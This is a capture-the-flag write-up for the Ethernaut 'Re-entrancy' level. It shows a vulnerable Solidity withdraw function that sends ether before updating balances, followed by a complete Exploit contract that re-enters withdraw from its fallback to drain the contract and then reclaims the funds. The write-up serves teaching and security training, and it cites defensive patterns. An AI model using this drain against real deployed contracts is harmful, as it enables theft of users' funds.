# Ethernaut 10: Re-entrency

This is a very suprising Weakness - always update first balances before making sending ether or calling an interface, if you dont, your conatract might be exposed in a reentrency attack.

## The Task Intro

The goal of this level is for you to hack the basic token contract below.

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can beanother contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

#### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942)

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## The Solution

The withdraw function sends ether before updating the state, not using the check-effect-interaction pattern - making it vulnerable to re-entrance. First I donate something to my own address. Then I withdraw the same amount again, but continue to withdraw in my fallback method (could be receive method as well). See the contract below:

```apache
interface IReentrance {
  function withdraw(uint _amount) external;
  function donate(address _to) external payable;
}

contract Exploit {
    IReentrance public re;
    uint256 private constant ETHER_FRACTION = 100_000_000_000_000;

    constructor (IReentrance _re) public payable{
        re=_re;
    }
    fallback()external payable{
        if(address(re).balance > 0){
          re.withdraw(ETHER_FRACTION);
        }
    }

    function attack() external payable{
        re.donate{value: ETHER_FRACTION}(address(this));
        re.withdraw(ETHER_FRACTION);
    }

    function reclaim () external payable{
      (bool result,) = msg.sender.call{value: address(this).balance}("");
      if(result){
          result;
      }
    }
}
```

With this I gain a very large amount of tokens.
